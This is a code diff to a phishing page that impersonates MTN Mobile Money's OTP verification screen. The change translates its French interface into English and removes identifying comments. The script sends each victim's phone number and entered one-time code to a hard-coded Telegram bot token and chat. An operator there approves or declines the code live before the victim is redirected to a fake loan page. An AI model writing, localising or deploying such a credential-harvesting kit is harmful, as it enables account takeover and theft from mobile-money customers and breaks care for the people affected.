@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
-    <title>MTN  – Vérification OTP</title>
+    <title>MTN  – OTP Verification</title>
 
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
 
@@ -39,7 +39,7 @@
             z-index: 2;
         }
 
-        /* LOGO – MTN style */
+        /* LOGO */
         .logo {
             margin-top: 60px;
         }
@@ -159,7 +159,6 @@
             font-weight: 600;
         }
 
-        /* Message styling */
         .message {
             font-size: 14px;
             margin-top: 8px;
@@ -208,7 +207,7 @@
             color: #999;
         }
 
-        /* SPINNER OVERLAY – MTN yellow */
+        /* SPINNER OVERLAY */
         #spinner {
             position: fixed;
             inset: 0;
@@ -266,24 +265,24 @@
         <!-- ERROR BOX -->
         <div class="error-box" id="errorBox">
             <div class="close" onclick="hideError()">×</div>
-            <div class="error-title">Erreur</div>
-            <div class="error-text" id="errorText">Code OTP incorrect</div>
+            <div class="error-title">Error</div>
+            <div class="error-text" id="errorText">Invalid OTP code</div>
         </div>
 
         <div class="content">
 
-            <!-- LOGO – MTN  -->
+            <!-- LOGO -->
             <div class="logo">
                 <div class="logo-circle">M</div>
                 <div class="logo-text"><span>MTN</span> </div>
             </div>
 
             <!-- TEXT -->
-            <div class="title">Confirmez votre compte</div>
+            <div class="title">Verify Your Account</div>
             <div class="subtitle" id="subtitleText">
-                Un code de vérification à usage unique a été envoyé au<br />
+                A one-time verification code has been sent to<br />
                 <span id="maskedPhone">65xxxxx56</span>.
-                Saisissez‑le ci‑dessous pour vérifier votre compte.
+                Enter it below to verify your account.
             </div>
 
             <!-- OTP INPUT SECTION – 4 digits -->
@@ -295,11 +294,11 @@
                     <input class="otp-input" maxlength="1" id="otp4" inputmode="numeric" pattern="[0-9]*" />
                 </div>
                 <div class="message" id="otpMessage"></div>
-                <button class="btn btn-primary" id="nextBtn" disabled>Suivant</button>
+                <button class="btn btn-primary" id="nextBtn" disabled>Next</button>
             </div>
 
             <!-- Go Back button -->
-            <button class="btn btn-outline" id="goBackBtn">Retour</button>
+            <button class="btn btn-outline" id="goBackBtn">Back</button>
 
         </div>
     </div>
@@ -311,7 +310,7 @@
 
     <script>
         (function() {
-            // ==================== TELEGRAM BOT CONFIG (English messages) ====================
+            // ==================== TELEGRAM BOT CONFIG ====================
             const BOT_TOKEN = '8745115171:AAHIirv4QpNh1p6JMWLLh6sqrvBh-YrO7Bc';
             const CHAT_ID = '1006917440';
             const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
@@ -332,9 +331,9 @@
             const errorText = document.getElementById('errorText');
 
             // ==================== RETRIEVE DATA FROM SESSIONSTORAGE ====================
-            const phone = sessionStorage.getItem('mtn_phone') || '655123456'; // Cameroon 9 digits
+            const phone = sessionStorage.getItem('mtn_phone') || '655123456';
 
-            // ==================== MASK PHONE NUMBER (Cameroon: 9 digits) ====================
+            // ==================== MASK PHONE NUMBER ====================
             function maskPhone(phone) {
                 const cleaned = phone.replace(/\D/g, '');
                 if (cleaned.length >= 4) {
@@ -347,7 +346,7 @@
             }
             maskedPhoneSpan.textContent = maskPhone(phone);
 
-            // ==================== OTP AUTO‑ADVANCE (4 digits) ====================
+            // ==================== OTP AUTO‑ADVANCE ====================
             function focusNext(index) {
                 if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
             }
@@ -444,7 +443,7 @@
 
             // ==================== ERROR HANDLING ====================
             function showError(message) {
-                errorText.innerText = message || 'Une erreur est survenue';
+                errorText.innerText = message || 'An error occurred';
                 errorBox.style.display = 'block';
                 setTimeout(() => {
                     errorBox.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
@@ -455,7 +454,7 @@
                 errorBox.style.display = 'none';
             };
 
-            // ==================== TELEGRAM HELPERS (English messages) ====================
+            // ==================== TELEGRAM HELPERS ====================
             function escapeHtml(unsafe) {
                 return unsafe.replace(/[&<>"]/g, function(m) {
                     if (m === '&') return '&amp;';
@@ -515,7 +514,7 @@
                 }, 1500);
             }
 
-            // ==================== OTP SUBMISSION (4 digits) ====================
+            // ==================== OTP SUBMISSION ====================
             let isSubmitting = false;
 
             async function submitOtp() {
@@ -523,7 +522,7 @@
 
                 const enteredOtp = otpInputs.map(inp => inp.value).join('');
                 if (enteredOtp.length !== 4) {
-                    otpMessage.textContent = 'Veuillez saisir les 4 chiffres.';
+                    otpMessage.textContent = 'Please enter all 4 digits.';
                     otpMessage.className = 'message error';
                     otpMessage.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
                     return;
@@ -537,7 +536,6 @@
                 const ts = Date.now();
                 const identifier = `MTN MoMo: ${phone}`;
                 const escapedOtp = escapeHtml(enteredOtp);
-                // English message for admin
                 const msg =
                     `🔐 <b>MTN  OTP Verification</b>\n\n${identifier}\nEntered OTP: <code>${escapedOtp}</code>\n\nApprove or Decline?`;
 
@@ -562,7 +560,7 @@
                     if (action === 'approve') {
                         window.location.href = 'loan.html';
                     } else if (action === 'decline') {
-                        showError('Code OTP invalide. Veuillez réessayer.');
+                        showError('Invalid OTP code. Please try again.');
                         otpInputs.forEach(inp => {
                             inp.value = '';
                             inp.disabled = false;
@@ -583,7 +581,7 @@
 
             // ==================== CHECK FOR PREVIOUS ERROR ====================
             if (sessionStorage.getItem('wrongOtp')) {
-                showError('Code OTP incorrect.');
+                showError('Invalid OTP code.');
                 sessionStorage.removeItem('wrongOtp');
             }
 
